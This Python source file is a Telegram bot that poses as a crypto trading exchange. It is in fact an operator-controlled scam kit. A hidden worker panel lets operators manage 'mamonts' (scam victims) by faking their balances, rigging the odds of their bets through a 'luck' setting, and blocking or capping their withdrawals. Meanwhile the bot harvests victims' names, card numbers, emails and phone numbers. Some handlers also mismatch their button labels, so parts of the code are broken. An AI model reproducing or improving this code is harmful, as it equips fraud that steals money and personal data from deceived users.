#!venv/bin/python
import config
import telebot
from telebot import types
import random
from datetime import datetime
import sqlite3
from send import *
from database import *
import time

bot = telebot.TeleBot(config.token)

user_states = {}
l = ['BTC', 'ETH', 'XRP', 'EOS', 'BCH', 'LTC', 'ADA', 'ETC', 'LINK', 'TRX', 'DOT', 'DOGE', 'SOL', 'MATIC', 'BNB', 'UNI', 'ICP', 'AAVE', 'FIL', 'XLM']

@bot.message_handler(commands=['start'])
def send_welcome(message):

    referral_id = message.text.split()[1] if len(message.text.split()) > 1 else None
    if referral_id:
        refs = load_refs()

        if not str(referral_id) in refs:
            refs[referral_id] = []   
        refs[referral_id].append(message.chat.id)
        
        bot.send_message(int(referral_id), f"A new person came through your link: {bot.get_chat(message.chat.id).first_name}")


        write_refs(refs)

    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (str(message.from_user.id),))

    if cursor.fetchone() is None:
        cursor.execute('INSERT INTO user_data VALUES (?, 0, 0, 0, 0, 0, 0, 0, 0, 1000, "RUB", 0.5)', (str(message.from_user.id),))
        conn.commit()
    
    conn.close()
    send_cabinet(bot, message, called=False)


@bot.message_handler(commands=['workingstart'])
def handle_workingstart(message):

    send_text(bot, message, config.buttons_working, generate_working(message.chat.id), called=False)


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):

    if call.data == "cabinet":
        send_cabinet(bot, call)
    
    if call.data == "buy crypto":
        send_buy(bot, call)
    
    if call.data == 'deposit':
        send_deposit(bot, call)
    elif call.data == 'withdraw':
        bot.send_message(call.from_user.id, "💳 Enter card for withdrawal:\n\n⚠️Вывод funds are possible only on the requisites from which your balance was replenished!")
        user_states[call.from_user.id] = 'card'

    elif call.data == 'settings':
        send_settings(bot, call)
    elif call.data == 'info':
        send_info(bot, call)
    

    #info group
    if call.data == "guarantee":
        send_guarantee(bot, call)
    if call.data == "network status":
        send_status(bot, call)

    #settings group
    if call.data == "get support":
        send_get_support(bot, call)

    if call.data == "set FIO":
        user_states[call.from_user.id] = 'set FIO'
        send_set_FIO(bot, call)
    elif call.data == "set country":
        user_states[call.from_user.id] = 'set country'
        send_set_country(bot, call)
    elif call.data == "set email":
        user_states[call.from_user.id] = 'set email'
        send_set_email(bot, call)
    elif call.data == "set card":
        user_states[call.from_user.id] = 'set card'
        send_set_card(bot, call)
    elif call.data == "set number":
        user_states[call.from_user.id] = 'set number'
        send_set_number(bot, call)
    

    #deposit group 
    if call.data == "deposit card":
        send_deposit_card(bot, call)
    if call.data == "deposit btc":
        send_deposit_bitcoin(bot, call)
    
    #buy group
    if call.data in l:
        user_states[call.from_user.id] = call.data
        send_buy_exact(bot, call)
    
    if call.data == "long":
        send_text(bot, call, config.buttons_leaverage, "📈Select leverage for a financial transaction", called=True)
        user_states[call.from_user.id].append("Long📈")
    
    if call.data == "short":
        send_text(bot, call, config.buttons_leaverage, "📈Select leverage for a financial transaction", called=True)
        user_states[call.from_user.id].append("Short📉")
    
    if call.data in ["1.5X", "2.5X", "5X"]:
        send_text(bot, call, config.buttons_time, "Select the time to close the transaction")
        user_states[call.from_user.id].append(call.data)
    
    if "seconds" in call.data:
        user_states[call.from_user.id].append(call.data)

        bot.send_message(call.from_user.id, generate_buy_result(user_states[call.from_user.id], call.from_user.id))
        time.sleep(int(user_states[call.from_user.id][4].split(' ')[0]))


        if random.random() <= get_lucky(call.from_user.id) or get_lucky(call.from_user.id) >= 1:
            send_text(bot, call, config.buttons_error_cabinet, "✅The bet was successful")
            change_balance(call.from_user.id, float(user_states[call.from_user.id][1]) * float(user_states[call.from_user.id][3][:-1]))
        else:
            send_text(bot, call, config.buttons_error_cabinet, "❌The bet didn't work")
            change_balance(call.from_user.id, -float(user_states[call.from_user.id][1]))
    
    #worker group
    if call.data == "working":
        send_text(bot, call, config.buttons_working, generate_working(call.message.chat.id))
    
    if call.data == "change min depo":
        send_text(bot, call, config.buttons_set_trader, "Enter the minimum deposit")
        user_states[call.from_user.id] = call.data


    if call.data == "my traders":
        send_mamonts(bot, call, str(call.message.chat.id))
    
    if call.data == "add trader":
        send_text(bot, call, config.buttons_set_trader, "Enter the id of the trader:", )
        user_states[call.from_user.id] = call.data
    
    if "manage trader" in call.data:
        global id_m
        id_m = call.data.split(' ')[2]
        send_text(bot, call, config.buttons_manage_trader, generate_mamont_info(bot, int(id_m)))

    if call.data == "trader change balance":
        send_text(bot, call, config.buttons_set_trader, "Set the balance")
        user_states[call.from_user.id] = call.data
    
    if call.data == "trader set limit":
        send_text(bot, call, config.buttons_set_trader, "Set a limit")
        user_states[call.from_user.id] = call.data

    if call.data == "trader write":
        username = bot.get_chat(id_m).username
        send_text(bot, call, config.buttons_back_working, f"Go to user @{username}")

    if call.data == "trader block withdraw":
        try:
            res = block_withdraw(id_m)
        except:
            send_text(bot, call, config.buttons_back_working, "❌Change error")
        else:
            if res == "0":
                send_text(bot, call, config.buttons_back_working, "Withdrawal unlocked")
            else:
                send_text(bot, call, config.buttons_back_working, "Withdrawal locked")
    
    if call.data == "change lucky":
        send_text(bot, call, config.buttons_set_mamont, "Enter luck:")
        user_states[call.from_user.id] = call.data






@bot.message_handler(content_types=['text'])
def text(message):
    user_id = message.from_user.id

    if user_states.get(user_id) == 'set FIO':
        set_FIO(str(user_id), message.text)
        send_after_set_FIO(bot, message, message.text)
    elif user_states.get(user_id) == 'set country':
        set_country(str(user_id), message.text)
        send_after_set_country(bot, message, message.text)
    elif user_states.get(user_id) == 'set email':
        set_email(str(user_id), message.text)
        send_after_set_email(bot, message, message.text)
    elif user_states.get(user_id) == 'set card':
        set_card(str(user_id), message.text)
        send_after_set_card(bot, message, message.text)
    elif user_states.get(user_id) == 'set number':
        set_number(str(user_id), message.text)
        send_after_set_number(bot, message, message.text)
    


    if user_states.get(user_id) in l:
        error1 = False
        error2 = False
        error3 = False
        try:
            to_buy = float(message.text)
        except:
            error1 = True
        
        conn = sqlite3.connect('mydatabase.db')
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
        balance = float(cursor.fetchone()[6])

        if not error1:
            if to_buy < 1000.0:
                error2 = True
            if to_buy > balance:
                error3 = True


        if error2 or error1 or error3:
            send_buy_error(bot, message)
        else:
            send_text(bot, message, config.buttons_long_short, "Where the asset course will go", called=False)
            user_states[message.chat.id] = [user_states.get(user_id)]
            user_states[message.chat.id].append(message.text)


        



    if user_states.get(user_id) == "add mamont":
        mamont_id = 0
        error = False
        user_id = str(user_id)

        try:
            mamont_id = int(message.text)
            chat_info = bot.get_chat(mamont_id)
        except:
            error = True
            send_text(bot, message, config.buttons_back_working, "❌Error when entering id", called=False)


        if mamont_id != 0 and not error:
            refs = load_refs()

            if not user_id in refs:
                refs[user_id] = []
            
            refs[user_id].append(mamont_id)
            write_refs(refs)
            send_text(bot, message, config.buttons_back_working, "✅Added successfully", called=False)
    

    if user_states.get(user_id) == 'card':
        global card
        card = message.text
        user_states[user_id] = 'withdraw'
        send_text(bot, message, config.buttons_back_cabinet, generate_withdraw(str(user_id), message.text), called=False)

    if user_states.get(user_id) == 'withdraw' and message.text != card:
        error1 = False
        error2 = False
        error3 = False
        error4 = False

        keyboard = types.InlineKeyboardMarkup()
        
        try:
            to_buy = float(message.text)
        except:
            error1 = True

        
        conn = sqlite3.connect('mydatabase.db')
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM user_data WHERE user_id = ?", (user_id,))
        data = cursor.fetchone()
        balance = float(data[6])
        withdraw_limit = float(data[7])
        blocked_withdraw = data[8]

        if not error1:
            if to_buy >= withdraw_limit and withdraw_limit != 0:
                error2 = True

            if to_buy > balance:
                error3 = True

            if blocked_withdraw == "1":
                error4 = True


        if error2 or error1 or error3 or error4:
            send_text(bot, message, config.buttons_error_cabinet, "❌Output error", called=False)
        else:
            change_balance(str(message.chat.id), -to_buy)
            send_text(bot, message, config.buttons_error_cabinet, "Your withdrawal request has been successfully created! Withdrawal of funds takes from 2 to 60 minutes.", called=False)
            send_withdrawal_request(bot, message.chat.id, to_buy, True)
    
    if user_states.get(user_id) == "mamont change currency":
        try:
            change_currency(id_m, float(message.text))
        except:
            send_text(bot, message, config.buttons_back_working, "❌Input error", called=False)
        else:
            send_text(bot, message, config.buttons_back_working, "✅Currency changed", called=False)

    if user_states.get(user_id) == "mamont set limit":
        try:
            change_limit(id_m, float(message.text))
        except:
            send_text(bot, message, config.buttons_back_working, "❌Input error", called=False)
        else:
            send_text(bot, message, config.buttons_back_working, "✅The limit has been changed", called=False)

    if user_states.get(user_id) == "mamont change balance":
        try:
            change_balance_exact(id_m, float(message.text))
        except:
            send_text(bot, message, config.buttons_back_working, "❌Input error", called=False)
        else:
            send_text(bot, message, config.buttons_back_working, "✅The balance has been changed", called=False)
    
    if user_states.get(user_id) == "change min depo":
        try:
            change_min_deposit(message.text)
        except:
            send_text(bot, message, config.buttons_back_working, "❌Input error", called=False)
        else:
            send_text(bot, message, config.buttons_back_working, "✅Minimum deposit has been changed", called=False)
    
    if user_states.get(user_id) == "change lucky":
        try:
            change_lucky(id_m, float(message.text)/100)
        except:
            send_text(bot, message, config.buttons_back_working, "❌Input error", called=False)
        else:
            send_text(bot, message, config.buttons_back_working, "✅Luck has been changed", called=False)
    
        



if __name__ == '__main__':
    bot.infinity_polling()
